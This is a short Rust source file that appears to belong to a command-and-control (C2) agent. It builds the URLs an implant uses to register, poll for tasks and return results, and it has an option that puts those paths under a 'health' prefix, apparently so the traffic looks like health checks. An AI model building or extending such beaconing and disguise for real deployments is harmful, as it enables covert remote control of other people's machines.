//! Endpoint path construction for C2 protocol.

use crate::constants::{HEALTH_BASE_PATH, HEALTH_PROFILE_NAME};

/// Builds register, poll, and result URLs for an agent.
#[derive(Debug, Clone)]
pub struct Endpoints {
    pub register: String,
    pub poll: String,
    pub result: String,
}

impl Endpoints {
    /// Creates endpoints for the given base URL and agent_id.
    /// If profile_name == HEALTH_PROFILE_NAME, uses health path prefix.
    pub fn new(base: &str, profile_name: &str, agent_id: &str) -> Self {
        let is_health = profile_name == HEALTH_PROFILE_NAME;
        if is_health {
            Self {
                register: format!("{}{}/register", base, HEALTH_BASE_PATH),
                poll: format!("{}{}/poll/{}", base, HEALTH_BASE_PATH, agent_id),
                result: format!("{}{}/result/{}", base, HEALTH_BASE_PATH, agent_id),
            }
        } else {
            Self {
                register: format!("{}/register", base),
                poll: format!("{}/poll/{}", base, agent_id),
                result: format!("{}/result/{}", base, agent_id),
            }
        }
    }
}
